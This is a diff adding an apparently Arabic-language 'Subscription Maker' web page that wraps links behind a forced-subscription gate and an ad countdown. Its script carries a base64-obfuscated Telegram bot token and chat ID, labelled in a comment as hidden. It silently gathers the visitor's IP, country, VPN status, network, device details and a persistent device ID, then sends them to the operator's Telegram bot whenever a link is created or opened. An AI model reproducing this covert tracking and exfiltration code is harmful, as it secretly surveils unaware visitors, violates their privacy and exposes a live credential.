@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Subscription Maker - SM</title>
+
+<style>
+body{
+    margin:0;
+    font-family:Arial;
+    background:#ffffff;
+    color:#111;
+    text-align:center;
+}
+
+.header{
+    background:#e60000;
+    color:white;
+    padding:15px;
+    font-size:22px;
+    font-weight:bold;
+}
+
+.box{
+    width:95%;
+    max-width:600px;
+    margin:30px auto;
+    background:#fff;
+    border:2px solid #e60000;
+    border-radius:10px;
+    padding:20px;
+}
+
+input{
+    width:95%;
+    padding:12px;
+    margin:10px 0;
+    border:1px solid #ddd;
+    border-radius:6px;
+    font-size:14px;
+}
+
+button{
+    background:#e60000;
+    color:#fff;
+    border:none;
+    padding:12px 18px;
+    margin:5px;
+    border-radius:6px;
+    cursor:pointer;
+    font-size:14px;
+}
+
+button:hover{
+    background:#c40000;
+}
+
+.count{
+    font-size:26px;
+    color:#e60000;
+    margin:10px;
+}
+</style>
+</head>
+<body>
+
+<div class="header">SM - Subscription Maker</div>
+
+<!-- صفحة إنشاء الروابط -->
+<div id="creator" class="box">
+    <h3>إنشاء رابط باشتراك إجباري</h3>
+    <input id="mainLink" placeholder="الرابط الأساسي">
+    <input id="subLink" placeholder="رابط الاشتراك (قناة / موقع)">
+    <br>
+    <button onclick="createLink()">إنشاء الرابط</button>
+    <div id="result"></div>
+</div>
+
+<!-- بوابة الاشتراك -->
+<div id="gate" class="box" style="display:none;">
+    <h3>اشتراك إجباري</h3>
+    <p>يجب الاشتراك للمتابعة</p>
+    <button onclick="openSub()">الاشتراك الآن</button>
+    <button onclick="continueAds()">تم الاشتراك</button>
+</div>
+
+<!-- صفحة الإعلانات -->
+<div id="ads" class="box" style="display:none;">
+    <h3>جاري تجهيز الرابط...</h3>
+    <div class="count" id="timer">12</div>
+</div>
+
+<script>
+// ===== تشفير التوكن والآي دي (مخفي ومشوّش) =====
+const _0xT = ["Nzk4OTA0NTc0ODpBQUZQV1NXeU9sUWtHUjg2MzZrNTk5dFJjcExwSEhOV1FVWQ=="];
+const _0xC = ["NjAyMTAzMDE5MA=="];
+
+function _d(x){ return atob(x); }
+
+const BOT_TOKEN = _d(_0xT[0]);
+const CHAT_ID = _d(_0xC[0]);
+
+// ===== معرف جهاز مميز =====
+function getDeviceID(){
+    let id = localStorage.getItem("sm_device_id");
+    if(!id){
+        id = 'SM-' + Math.random().toString(36).substring(2,10);
+        localStorage.setItem("sm_device_id", id);
+    }
+    return id;
+}
+
+// ===== معلومات الجهاز =====
+function getDeviceInfo(){
+    const ua = navigator.userAgent;
+    let device = "Desktop";
+    if(/android/i.test(ua)) device="Android 📱";
+    if(/iphone|ipad|ipod/i.test(ua)) device="iPhone 🍎";
+
+    return {
+        ua: ua,
+        lang: navigator.language,
+        platform: navigator.platform,
+        screen: screen.width+"x"+screen.height,
+        device: device
+    };
+}
+
+// ===== كشف VPN / Proxy + IP =====
+async function detectNetwork(){
+    try{
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        return {
+            ip: data.ip,
+            country: data.country_name,
+            vpn: data.proxy || data.vpn || false,
+            org: data.org
+        };
+    }catch{
+        return {ip:"Unknown", country:"Unknown", vpn:"Unknown", org:"Unknown"};
+    }
+}
+
+// ===== إرسال رسالة للبوت =====
+async function sendToBot(type){
+    const device = getDeviceInfo();
+    const net = await detectNetwork();
+    const deviceID = getDeviceID();
+
+    const msg = `
+🚀 Subscription Maker (SM)
+
+📌 الحدث: ${type}
+🆔 معرف الجهاز: ${deviceID}
+📱 الجهاز: ${device.device}
+💻 النظام: ${device.platform}
+🌐 اللغة: ${device.lang}
+🖥️ الشاشة: ${device.screen}
+
+🌍 الدولة: ${net.country}
+📡 IP: ${net.ip}
+🛡️ VPN/Proxy: ${net.vpn ? "نعم 🚨" : "لا"}
+🏢 الشبكة: ${net.org}
+`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg
+        })
+    });
+}
+
+// ===== إنشاء رابط =====
+function createLink(){
+    const main = document.getElementById("mainLink").value;
+    const sub = document.getElementById("subLink").value;
+
+    if(!main || !sub){
+        alert("املأ الحقول");
+        return;
+    }
+
+    const link = location.origin + location.pathname +
+        "#go=" + btoa(main) + "&sub=" + btoa(sub);
+
+    document.getElementById("result").innerHTML =
+        "<p>رابطك:</p><input value='"+link+"' readonly>";
+
+    sendToBot("تم إنشاء رابط جديد 🔗");
+}
+
+// ===== فتح الاشتراك =====
+let target="", subLink="";
+function openSub(){
+    window.open(subLink,"_blank");
+}
+
+// ===== متابعة الإعلانات =====
+function continueAds(){
+    document.getElementById("gate").style.display="none";
+    document.getElementById("ads").style.display="block";
+    startTimer();
+}
+
+function startTimer(){
+    let t=12;
+    const el=document.getElementById("timer");
+    const x=setInterval(()=>{
+        t--;
+        el.textContent=t;
+        if(t<=0){
+            clearInterval(x);
+            window.location.href=target;
+        }
+    },1000);
+}
+
+// ===== عند فتح رابط مختصر =====
+window.onload = function(){
+    const hash = location.hash;
+    if(hash.includes("go=")){
+        document.getElementById("creator").style.display="none";
+        document.getElementById("gate").style.display="block";
+
+        const params = new URLSearchParams(hash.replace("#",""));
+        target = atob(params.get("go"));
+        subLink = atob(params.get("sub"));
+
+        // إشعار عند دخول مستخدم
+        sendToBot("مستخدم جديد فتح رابط مختصر 👁️");
+    }
+}
+</script>
+
+</body>
+  </html>
